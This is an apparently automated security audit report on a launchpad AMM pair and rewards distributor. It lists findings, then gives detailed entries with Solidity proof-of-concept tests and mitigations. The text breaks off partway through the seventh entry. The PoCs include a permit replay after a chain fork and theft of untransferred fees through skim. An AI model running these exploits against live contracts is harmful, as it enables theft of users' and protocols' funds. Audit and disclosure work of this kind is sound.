# 2025 08 gte perps - Findings Report
## Commit hash: f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7

##Findings by Pattern


 **Derived From** : Replayable Permits due to Static Domain Separator

[L-1]. Permit Replay Attack via Static Domain Separator
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 1
Privilege: Permissionless



 **Derived From** : Rewards accrual precision loss freezes funds due to index truncation

[H-2]. Precision loss in RewardsTrackerLib permanently locks rewards due to division before multiplication
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless



 **Derived From** : AccountingInvariantViolation

[M-3]. Fee Skimming via `skim` if Distributor Fails to Pull Tokens
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: Permissionless
[M-4]. DoS in Launchpad Pair swaps when Distributor staking pool is empty
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 2
Privilege: Permissionless
[H-5]. Precision Loss in RewardsTrackerLib leads to permanent loss of rewards
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless
[H-6]. Launchpad Graduation Function Permanently Disables Fee Accrual for Distributor
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: RequiresRole
[H-7]. User Rewards Diverted to Launchpad Contract in `increaseStake`
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: RequiresRole
[M-8]. Permanent DoS of `burn` function when fees are accrued
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless
[H-9]. Theft of Accrued Launchpad Fees via mint() due to Reserve/Balance Mismatch
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless
[H-10]. Launchpad Graduation Permanently Disables Fee Accrual
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: RequiresRole



 **Derived From** : StandardViolation

[L-11]. DoS on USDT Pairs due to Unsafe Approval Reset in `_distributeLaunchpadFees`
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : UnsafeAssembyTypeCasts

[H-12]. Unsafe Downcast in Reward Debt Calculation allows draining Rewards Distributor
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless



 **Derived From** : GriefableCallbacks

[M-13]. DoS via Griefable Distributor Callback
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless



 **Derived From** : AccessControlOrAuthByPass

[H-14]. addRewards allows depositing mismatched quote tokens to inflate reward pool
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Liquidity Pool DoS via Griefable Fee Distribution Callback

[H-15]. Launchpad Pair swaps revert if Distributor staking pool is empty
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Issue Type: AccountingInvariantViolation

 ### Relevant Function/Location: GTELaunchpadV2Pair.burn

[M-16]. Liquidity Burn Revert Due to Fee/Balance Mismatch
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless



 **Derived From** : SignatureMalleability

[L-17]. Permit Signature Malleability allows Front-running DoS
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 1
Privilege: Permissionless



 **Derived From** : PermitDomainSeparator

[L-18]. Replayable Permits due to Static DOMAIN_SEPARATOR
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 1
Privilege: Permissionless



 **Derived From** : Issue Type: AccountingInvariantViolation

 ### Relevant Function/Location: GTELaunchpadV2Pair.mint

[H-19]. Yield Theft via Minting During Same-Block Fee Accrual
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : FlashLoanEconomicManipulation

[M-20]. Theft of Launchpad Fees via LP Flash Loan Manipulation
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : MaturityorGatingByPass

[M-21]. Accrued fees deleted without distribution in endRewardsAccrual
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: RequiresRole


### Number of Findings
- C: 0
- H: 10
- M: 7
- L: 4
- I: 0

##Findings by Pattern


 **Derived From** : Replayable Permits due to Static Domain Separator

## [L-1]. Permit Replay Attack via Static Domain Separator

### Finding Severity Justification: The vulnerability relies on a specific and rare external event: a chain hard fork that changes the Chain ID while preserving contract state. While the impact of a permit replay is High (theft of funds), Gate 4 (Likelihood) assesses this as Rare. According to the Severity Matrix, High Impact + Rare Likelihood results in Low Severity. The use of a static DOMAIN_SEPARATOR is a known legacy pattern from Uniswap V2.
## Derived From Pattern/Invariant
Replayable Permits due to Static Domain Separator

## Exploit Type
ReplayAttack

## Location
UniswapV2ERC20.constructor

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 1
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `DOMAIN_SEPARATOR` is calculated in the constructor using the `chainId` at deployment time. It is immutable. If the chain forks (e.g. hard fork with chainId change), the `DOMAIN_SEPARATOR` becomes invalid on the new chain but the contract continues to use it. This allows permits signed on one chain to be replayed on the other.

## Impact
Users' permits can be replayed on forked chains, potentially allowing unauthorized fund access.

## Command to Run Test


## Proof of Concept
1. Chain forks, ID changes. 2. User signs permit on Chain A. 3. Attacker submits same permit on Chain B. 4. Contract on Chain B uses old Chain ID in separator, so signature validates.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract PermitReplayTest is Test {
    GTELaunchpadV2Pair pair;
    uint256 constant INITIAL_CHAIN_ID = 1;
    uint256 constant FORK_CHAIN_ID = 1337;
    
    uint256 ownerPrivateKey = 0xA11CE;
    address owner;
    address spender = address(0xB0B);

    bytes32 DOMAIN_SEPARATOR;
    // keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    bytes32 constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;

    function setUp() public {
        owner = vm.addr(ownerPrivateKey);
        
        // 1. Deploy on Initial Chain
        vm.chainId(INITIAL_CHAIN_ID);
        pair = new GTELaunchpadV2Pair();
        DOMAIN_SEPARATOR = pair.DOMAIN_SEPARATOR();
    }

    function testPermitReplayOnFork() public {
        uint256 value = 1000 ether;
        uint256 deadline = block.timestamp + 1 days;
        uint256 nonce = pair.nonces(owner);

        // 2. Create a signature valid for the INITIAL_CHAIN_ID
        // The digest uses the DOMAIN_SEPARATOR stored at deployment (containing INITIAL_CHAIN_ID)
        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonce, deadline));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPrivateKey, digest);

        // 3. Simulate Hard Fork: Chain ID changes
        vm.chainId(FORK_CHAIN_ID);

        // 4. Replay Attack
        // The contract still uses the static DOMAIN_SEPARATOR with the old Chain ID.
        // Thus, the signature signed for the old chain is accepted on the new chain.
        pair.permit(owner, spender, value, deadline, v, r, s);

        // Assert the permit was successful
        assertEq(pair.allowance(owner, spender), value, "Permit replay failed");
    }
}

## Suggested Mitigation
Recompute `DOMAIN_SEPARATOR` if `block.chainid` changes, or store `INITIAL_CHAIN_ID` and `INITIAL_DOMAIN_SEPARATOR` and recompute on mismatch.





 **Derived From** : Rewards accrual precision loss freezes funds due to index truncation

## [H-2]. Precision loss in RewardsTrackerLib permanently locks rewards due to division before multiplication

### Finding Severity Justification: The finding identifies a critical precision loss in `RewardsTrackerLib.getAccRewardsPerShare`. The calculation `(pending * PRECISION_FACTOR) / totalShares` uses a fixed precision factor of `1e12`. When the reward token has 6 decimals (e.g., USDC, a primary use case for Launchpad pairs) and the staking token has 18 decimals (LaunchToken), the numerator (`1e6 * 1e12 = 1e18`) is frequently smaller than the denominator (`totalShares`), which will likely exceed `1e18` (1 token). This results in integer division rounding to zero. Since `update()` unconditionally clears `pendingBaseRewards` after this calculation, the reward amount is effectively deleted from the distribution logic while remaining locked in the contract's balance (and accounted for in `totalPendingRewards`, preventing admin retrieval). This leads to a permanent loss of yield for users.
## Derived From Pattern/Invariant
Rewards accrual precision loss freezes funds due to index truncation

## Exploit Type
RoundingError

## Location
RewardsTrackerLib.getAccRewardsPerShare

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `RewardsTrackerLib.getAccRewardsPerShare`, the accumulated reward per share is updated using `(pending * PRECISION_FACTOR) / totalShares`, where `PRECISION_FACTOR` is `1e12`. For standard 18-decimal tokens, `totalShares` can easily exceed `1e27`. If the reward token has fewer decimals (e.g., USDC with 6 decimals), a reward of even 1,000,000 USDC (`1e12`) results in `(1e12 * 1e12) / 1e27 = 0`. The function then deletes `pendingBaseRewards` without incrementing the accumulator, effectively deleting the rewards from the distribution logic while they remain locked in the contract.

## Impact
Permanent loss of rewards for stakers. Funds are locked in the Distributor contract and cannot be skimmed as they are accounted for in `totalPendingRewards`.

## Command to Run Test


## Proof of Concept
1. Create a reward pool for an 18-decimal token (shares) and a 6-decimal token (rewards).
2. Ensure `totalShares` is `1e27` (1 billion tokens).
3. `addRewards` of 100 USDC (`1e8`).
4. `getAccRewardsPerShare` calculates `(1e8 * 1e12) / 1e27 = 0`.
5. `update` clears pending rewards.
6. Accumulator remains unchanged; users claim 0 rewards.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {Distributor} from "./Distributor.sol";
import {MockERC20} from "forge-std/mocks/MockERC20.sol";

contract PrecisionLossTest is Test {
    Distributor distributor;
    MockERC20 launchToken;
    MockERC20 rewardToken;
    address alice = address(0x1);

    function setUp() public {
        launchToken = new MockERC20();
        launchToken.initialize("Launch", "LCH", 18);
        rewardToken = new MockERC20();
        rewardToken.initialize("USDC", "USDC", 6);

        distributor = new Distributor();
        distributor.initialize(address(this));
        distributor.createRewardsPair(address(launchToken), address(rewardToken));
    }

    function testPrecisionLossLocksRewards() public {
        // 1. Simulate large staking supply (1 Billion tokens = 1e27 wei)
        uint96 stakeAmount = 1e27;
        launchToken.mint(address(this), uint256(stakeAmount));
        launchToken.approve(address(distributor), uint256(stakeAmount));
        distributor.increaseStake(address(launchToken), address(this), stakeAmount);

        // 2. Add rewards (100 USDC = 100 * 1e6 = 1e8 wei)
        uint128 rewardAmount = 100e6;
        rewardToken.mint(address(this), rewardAmount);
        rewardToken.approve(address(distributor), rewardAmount);
        distributor.addRewards(address(launchToken), address(rewardToken), 0, rewardAmount);

        // 3. Verify precision loss: (1e8 * 1e12) / 1e27 = 0
        (uint256 pendingBase, uint256 pendingQuote) = distributor.getPendingRewards(address(launchToken), address(this));
        assertEq(pendingQuote, 0, "Pending rewards should be 0 due to precision loss");

        // 4. Verify permanent lock
        // Claim updates state, deleting pending rewards but adding 0 to accumulator
        distributor.claimRewards(address(launchToken));
        
        // Funds remain in contract
        assertEq(rewardToken.balanceOf(address(distributor)), rewardAmount);
        
        // Admin cannot skim because accounting says funds are 'pending' (totalPendingRewards not decreased)
        vm.expectRevert(Distributor.SkimOverflow.selector);
        distributor.skimExcessRewards(address(rewardToken), 1);
    }
}

## Suggested Mitigation
Increase `PRECISION_FACTOR` to `1e24`. This provides enough precision to handle 6-decimal rewards against 18-decimal staking shares (e.g., `1e6 * 1e24 / 1e27 = 1000`, preserving value) while keeping the intermediate calculation `shares * accRewardsPerShare` within `uint256` limits to prevent overflows that `1e36` might cause.





 **Derived From** : AccountingInvariantViolation

## [M-3]. Fee Skimming via `skim` if Distributor Fails to Pull Tokens

### Finding Severity Justification: The finding identifies a breakdown in accounting integrity where the contract updates its internal `reserve` state based on the assumption that an external call (`Distributor.addRewards`) successfully transferred tokens out. By reducing `reserve` without verifying the balance change, any tokens NOT pulled by the Distributor (e.g., due to a pause state, dust logic, or gas limits) are permanently decoupled from the reserve but remain in the balance. These 'excess' tokens are then immediately stealable by any user via the `skim()` function. This constitutes a leak of protocol fees.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.skim

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `_update` function reduces `reserve` by `totalLaunchpadFee` and calls `_distributeLaunchpadFees`. It assumes the Distributor will immediately transfer these tokens out. If the Distributor implementation fails to pull the tokens (e.g. due to gas limits, pausing, or logic), the tokens remain in `balance` but are excluded from `reserve`. The `skim` function exposes `balance - reserve` to the public, allowing anyone to steal these untransferred fees.

## Impact
The `_update` function deducts fees from the reserves before confirming they have been transferred out. If the trusted `Distributor` fails to pull these tokens (due to pausing, logic error, or gas limits) during `addRewards`, the tokens remain in the contract balance but are excluded from the reserve. This discrepancy breaks the accounting invariant (`balance == reserve + accrued`) and allows any user to immediately steal the untransferred fees via `skim()`, resulting in a permanent loss of protocol revenue.

## Command to Run Test


## Proof of Concept
1. `_update` runs, calculating `fee`. `reserve` is reduced by `fee`.
2. `_distributeLaunchpadFees` calls `distributor.addRewards`.
3. Assume `distributor` records the reward but does not `transferFrom` (or fails silently).
4. `accrued` is set to 0.
5. `balance` is unchanged (High). `reserve` is Low.
6. Attacker calls `skim(attacker)`. The contract transfers `balance - reserve` (the fees) to the attacker.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import "@gte-univ2-core/interfaces/IERC20.sol";

// Minimal Mock Token
contract MockERC20 {
    string public name = "Mock";
    string public symbol = "MCK";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 value) public {
        totalSupply += value;
        balanceOf[to] += value;
    }
    function transfer(address to, uint256 value) public returns (bool) {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }
    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }
    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] -= value;
        balanceOf[from] -= value;
        balanceOf[to] += value;
        return true;
    }
}

// Mock Distributor that FAILS to pull tokens
contract MockBadDistributor {
    function addRewards(address, address, uint128, uint128) external {
        // Simulate success (no revert) but DO NOT transfer tokens
    }
}

contract SkimTheftTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    MockBadDistributor distributor;

    function setUp() public {
        token0 = new MockERC20();
        token1 = new MockERC20();
        distributor = new MockBadDistributor();
        pair = new GTELaunchpadV2Pair();
        
        // Sort tokens for pair init
        if (address(token0) > address(token1)) (token0, token1) = (token1, token0);
        
        pair.initialize(address(token0), address(token1), address(this), address(distributor));
        
        // Add initial liquidity
        token0.mint(address(pair), 1000 ether);
        token1.mint(address(pair), 1000 ether);
        pair.mint(address(this));
    }

    function testSkimTheft() public {
        // 1. Simulate a swap to accrue fees
        uint256 amountIn = 10 ether;
        token0.mint(address(pair), amountIn);
        
        // Swap triggers _update -> _distributeLaunchpadFees
        // Pair expects Distributor to pull fees, so it reduces Reserve
        pair.swap(0, 1 ether, address(this), "");

        // 2. Verify Accounting Mismatch
        (uint112 res0, , ) = pair.getReserves();
        uint256 bal0 = token0.balanceOf(address(pair));
        
        // Because Distributor didn't pull, Balance > Reserve
        // The difference is the fee that was supposed to be distributed
        uint256 leak = bal0 - res0;
        assertTrue(leak > 0, "Fees stuck in balance but removed from reserve");

        // 3. Exploit via skim()
        address attacker = address(0x1337);
        pair.skim(attacker);

        uint256 stolen = token0.balanceOf(attacker);
        assertEq(stolen, leak, "Attacker successfully skimmed the untransferred fees");
    }
}

## Suggested Mitigation
Update `_distributeLaunchpadFees` to explicitly transfer the tokens to the distributor instead of approving them. This ensures the tokens leave the contract, maintaining the reserve invariant. 

*Note: This requires the `Distributor` to accept direct transfers. If the Distributor is immutable and requires `transferFrom`, verify the balance decrease after the call instead.*

```solidity
    function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
        if ((fee0 | fee1) > 0) {
            address distributor = launchpadFeeDistributor;

            // FIX: Explicitly transfer tokens out so balance matches reserve deduction
            if (fee0 > 0) _safeTransfer(token0, distributor, fee0);
            if (fee1 > 0) _safeTransfer(token1, distributor, fee1);

            // Call distributor (Ensure Distributor logic supports receiving tokens directly)
            IDistributor(distributor).addRewards(token0, token1, uint128(fee0), uint128(fee1));

            emit LaunchpadFeesCollected(fee0, fee1);
        }
    }
```


## [M-4]. DoS in Launchpad Pair swaps when Distributor staking pool is empty

### Finding Severity Justification: The finding identifies a Denial of Service (DoS) vector in the core AMM pair. If the `Distributor` contract has zero shares (e.g., all users unstake, burn tokens, or during a migration gap), the `addRewards` function reverts. Since `GTELaunchpadV2Pair` calls this function within its critical `_update` routine (triggered by swaps, mints, and burns) without error handling, the entire liquidity pool becomes unusable. While the likelihood of reaching zero shares depends on the specific token logic (likely rare for active tokens), the impact is a complete freeze of the market, representing a significant fragility in the system.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair._distributeLaunchpadFees

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `GTELaunchpadV2Pair` contract logic mandates fee distribution to the `Distributor` during every `_update` (triggered by `swap`, `mint`, `burn`) via `_distributeLaunchpadFees`. This function calls `Distributor.addRewards`. 

`Distributor.addRewards` explicitly reverts with `NoSharesToIncentivize` if `rs.totalShares == 0`. 

If all users unstake their tokens (or if the pool has 0 shares immediately after graduation before users stake), `addRewards` reverts. Because `GTELaunchpadV2Pair` does not catch this revert, the entire AMM interaction fails. This creates a Denial of Service on the main liquidity pool dependent on the state of the external staking contract.

## Impact
Complete freeze of the liquidity pool (swaps/mints/burns revert) if the staking pool is empty.

## Command to Run Test


## Proof of Concept
1. Launchpad graduates, pair is live.
2. No users have staked in Distributor yet (or all have unstaked).
3. User tries to `swap` on the pair.
4. `pair.swap` -> `_update` -> `_distributeLaunchpadFees` -> `distributor.addRewards`.
5. `addRewards` sees `totalShares == 0` and reverts `NoSharesToIncentivize`.
6. Swap transaction fails.

## Proof of Code
contract DoSWhenNoStakersTest is Test {
    GTELaunchpadV2Pair pair;
    Distributor distributor;
    MockERC20 token0;
    MockERC20 token1;

    function setUp() public {
        token0 = new MockERC20("T0", "T0", 18);
        token1 = new MockERC20("T1", "T1", 18);
        if (address(token0) > address(token1)) (token0, token1) = (token1, token0);
        token0.mint(address(this), 100000e18);
        token1.mint(address(this), 100000e18);

        distributor = new Distributor();
        distributor.initialize(address(this));

        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), address(this), address(distributor));

        distributor.createRewardsPair(address(token0), address(token1));

        token0.transfer(address(pair), 1000e18);
        token1.transfer(address(pair), 1000e18);
        pair.mint(address(this));
    }

    function test_Revert_Swap_If_No_Stakers() public {
        uint256 amountIn = 10e18;
        token0.transfer(address(pair), amountIn);
        
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.swap(0, 5e18, address(this), "");
    }
}

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s) {}
    function mint(address to, uint256 amount) public { _mint(to, amount); }
}

## Suggested Mitigation
Modify `Distributor.addRewards` to handle the zero-share case gracefully without reverting AND without breaking Pair accounting. Specifically, if `rs.totalShares == 0`, the function should still transfer the fee tokens from the Pair to the Distributor (using `safeTransferFrom`) but skip the internal reward accounting update. This ensures the Pair's reserves match its balances, while the undistributed fees accumulate in the Distributor and can be recovered by the admin via `skimExcessRewards`.


## [H-5]. Precision Loss in RewardsTrackerLib leads to permanent loss of rewards

### Finding Severity Justification: The precision factor of 1e12 is insufficient for handling standard token configurations (e.g., 18-decimal staking tokens vs 6-decimal reward tokens like USDC). If the staking pool has a realistic TVL (e.g., 1M tokens = 1e24 wei), adding rewards less than 1M USDC (1e12 units) results in zero accretion due to rounding down. These rewards are removed from 'pendingBaseRewards' (local tracking) but remain in 'totalPendingRewards' (global tracking). Because the accumulator does not increase, users cannot claim them. Because 'totalPendingRewards' is not reduced, the admin cannot skim them (skim calculates balance - totalPending). This results in the permanent freezing of reward assets, which is a High severity impact.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
PricePrecision

## Location
RewardsTrackerLib.update

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `RewardsTrackerLib` uses a `PRECISION_FACTOR` of `1e12` to calculate `accBaseRewardPerShare`. When `totalShares` is large (e.g., > 1e18) and the pending reward amount is small (e.g., < 1e6, common for USDC with 6 decimals), the calculation `(pending * 1e12) / totalShares` rounds down to zero.

The `update` function resets `pendingBaseRewards` to 0 regardless of whether `accBaseRewardPerShare` increased. These rewards are effectively burned from the distribution logic but remain locked in the contract's balance and `totalPendingRewards` variable. They cannot be distributed to users, and `skimExcessRewards` cannot recover them because `totalPendingRewards` still accounts for them as liabilities.

## Impact
Permanent locking of reward funds. Over time, dust accumulation can lead to significant frozen value.

## Command to Run Test


## Proof of Concept
1. `totalShares` = 1e24 (1 million tokens).
2. `addRewards` adds 0.5 USDC (5e5 wei).
3. `update` called: `(5e5 * 1e12) / 1e24` = `5e17 / 1e24` = 0.
4. `accBaseRewardPerShare` does not change.
5. `pendingBaseRewards` is set to 0.
6. The 0.5 USDC is lost to stakers forever.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {MockERC20} from "forge-std/mocks/MockERC20.sol";
import {Distributor, RewardPoolDataMemory} from "../contracts/launchpad/Distributor.sol";

contract PrecisionLossTest is Test {
    Distributor distributor;
    MockERC20 launchToken;
    MockERC20 quoteToken; // USDC (6 decimals)

    address launchpad = address(0x123);
    address user = address(0x456);

    function setUp() public {
        launchToken = new MockERC20();
        launchToken.initialize("Launch", "LCH", 18);
        
        quoteToken = new MockERC20();
        quoteToken.initialize("Quote", "USDC", 6);

        distributor = new Distributor();
        distributor.initialize(launchpad);

        // Create pair (mocking launchpad call)
        vm.prank(launchpad);
        distributor.createRewardsPair(address(launchToken), address(quoteToken));
    }

    function testPrecisionLoss() public {
        uint96 stakeAmount = 1e24; // 1M tokens (18 decimals)
        uint128 rewardAmount = 5e5; // 0.5 USDC (6 decimals)

        // 1. User stakes 1M tokens
        vm.prank(launchpad);
        distributor.increaseStake(address(launchToken), user, stakeAmount);

        // 2. Add small rewards (0.5 USDC)
        quoteToken.mint(address(this), rewardAmount);
        quoteToken.approve(address(distributor), rewardAmount);
        distributor.addRewards(address(launchToken), address(quoteToken), 0, rewardAmount);

        // 3. Check Internal State
        RewardPoolDataMemory memory data = distributor.getRewardsPoolData(address(launchToken));
        
        // Calculation: (5e5 * 1e12) / 1e24 = 5e17 / 1e24 = 0
        assertEq(data.accQuoteRewardPerShare, 0, "AccRewards should be 0 due to precision loss");
        
        // Pending rewards are cleared despite 0 accumulation
        assertEq(data.pendingQuoteRewards, 0, "Pending rewards should be cleared to 0");
        
        // 4. Verify funds are effectively locked
        // User claims -> receives 0 because acc is 0
        vm.prank(user);
        ( , uint256 quoteClaimed) = distributor.claimRewards(address(launchToken));
        assertEq(quoteClaimed, 0, "User received 0 rewards");
        
        // Admin cannot skim because totalPendingRewards was incremented but never decremented
        vm.expectRevert(Distributor.SkimOverflow.selector);
        distributor.skimExcessRewards(address(quoteToken), 1);
    }
}

## Suggested Mitigation
Modify `RewardsTrackerLib` to use a higher `PRECISION_FACTOR` (e.g., `1e24` or `1e30`) to accommodate standard token decimals. Additionally, update the `update` function logic to prevent clearing `pendingBaseRewards` or `pendingQuoteRewards` if the calculated increment to `accRewardPerShare` is zero, effectively letting dust rewards accumulate until they are large enough to be distributed.


## [H-6]. Launchpad Graduation Function Permanently Disables Fee Accrual for Distributor

### Finding Severity Justification: The finding identifies a critical logic error in the protocol's lifecycle. The documentation and code structure indicate that the AMM pair (`GTELaunchpadV2Pair`) is intended to accrue trading fees to 'feed' the `Distributor`. However, the graduation process triggers `Distributor.endRewards`, which calls `pair.endRewardsAccrual()`, permanently setting `rewardsPoolActive` to 0. This occurs at the exact moment the AMM is deployed and trading begins, guaranteeing that the AMM will never accrue fees for the distributor. This results in a permanent and total loss of the intended yield/revenue stream for the protocol and stakers, constituting a High severity economic flaw.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.endRewards

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `Distributor.endRewards` function calls `pair.endRewardsAccrual()`, which sets `rewardsPoolActive` to 0 in the `GTELaunchpadV2Pair`. This function is documented to be called upon launchpad graduation to unlock transfers (transitioning from bonding curve to AMM). However, by setting `rewardsPoolActive` to 0, the pair permanently stops collecting trading fees for the Distributor. The `_update` function in the pair only distributes fees if `rewardsPoolActive > 0`. Consequently, the fee mechanism intended to incentivize stakers is disabled at the exact moment trading goes live.

## Impact
Permanent loss of all trading fee revenue for the protocol and stakers from the moment of graduation.

## Command to Run Test


## Proof of Concept
1. A `GTELaunchpadV2Pair` is deployed and active.
2. The Launchpad calls `Distributor.endRewards(pair)` upon graduation.
3. `Distributor` calls `pair.endRewardsAccrual()`.
4. `GTELaunchpadV2Pair` sets `rewardsPoolActive = 0`.
5. Subsequent swaps on the pair call `_update` -> `_distributeLaunchpadFees`.
6. Inside `_update`, the check `rewardsPoolActive > 0` fails, so 0 fees are collected/distributed.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {Distributor} from "../contracts/launchpad/Distributor.sol";
import {GTELaunchpadV2Pair} from "../contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {MockERC20} from "forge-std/mocks/MockERC20.sol";

contract GraduationFeeBugTest is Test {
    Distributor distributor;
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;

    address launchpad = address(0x999);
    address user = address(0x123);

    function setUp() public {
        // 1. Setup Tokens
        token0 = new MockERC20();
        token1 = new MockERC20();
        // Ensure deterministic sort for pair
        if (address(token0) > address(token1)) (token0, token1) = (token1, token0);

        // 2. Deploy Distributor & Init
        distributor = new Distributor();
        distributor.initialize(launchpad);

        // 3. Deploy Pair (Simulating Factory creation)
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), launchpad, address(distributor));
        
        // 4. Fund Pair and User for swap
        token0.mint(address(pair), 1000 ether);
        token1.mint(address(pair), 1000 ether);
        pair.sync();
        token0.mint(user, 100 ether);
    }

    function testGraduationPermanentlyDisablesFees() public {
        // Check initial state: Rewards active
        assertEq(pair.rewardsPoolActive(), 1, "Rewards should be active initially");

        // === EXPLOIT/BUG REPRODUCTION ===
        // Graduation triggers Launchpad to call distributor.endRewards
        vm.prank(launchpad);
        distributor.endRewards(pair);

        // Check state: Rewards permanently disabled
        assertEq(pair.rewardsPoolActive(), 0, "Rewards should be disabled after endRewards is called");

        // Perform Swap
        vm.startPrank(user);
        token0.transfer(address(pair), 10 ether);
        // swap 10 token0 for token1
        pair.swap(0, 5 ether, user, "");
        vm.stopPrank();

        // Check accrued fees
        (uint112 fee0, uint112 fee1,) = pair.getAccruedLaunchpadFees();
        
        // FAIL: No fees collected because rewardsPoolActive was 0
        assertEq(fee0, 0, "Fee0 should be 0 due to bug");
        assertEq(fee1, 0, "Fee1 should be 0 due to bug");
    }
}

## Suggested Mitigation
Remove the call to `pair.endRewardsAccrual()` inside `Distributor.endRewards`. The `endRewardsAccrual` function on the pair permanently disables fee generation, which contradicts the intention of the AMM pair feeding rewards to the Distributor after graduation. 

```diff
    function endRewards(IGTELaunchpadV2Pair pair) external onlyLaunchpad {
-       pair.endRewardsAccrual();
+       // Do not disable pair rewards upon graduation
    }
```


## [H-7]. User Rewards Diverted to Launchpad Contract in `increaseStake`

### Finding Severity Justification: The vulnerability causes a direct loss of user funds (accrued rewards). When a user purchases additional tokens via the Launchpad, the `Distributor.increaseStake` function is triggered. This function calculates pending rewards for the user ('account') but distributes them via `_distributeAssets`, which sends the tokens to `msg.sender`. Since `increaseStake` is called by the `Launchpad` contract, `msg.sender` is the Launchpad, not the user. The user's reward debt is updated as if they were paid, but the tokens are sent to the Launchpad contract where they are likely stuck. This constitutes a permanent loss of yield for users performing standard operations.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.increaseStake

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `Distributor.increaseStake` function calculates pending rewards for the `account` via `rs.stake`. It then calls `_distributeAssets` to transfer these rewards. However, `_distributeAssets` sends the tokens to `msg.sender`. When `increaseStake` is called by the `Launchpad` (due to `onlyLaunchpad`), `msg.sender` is the `Launchpad` contract, not the user (`account`). Consequently, any pending rewards the user had are sent to the Launchpad contract, where they are likely permanently locked.

## Impact
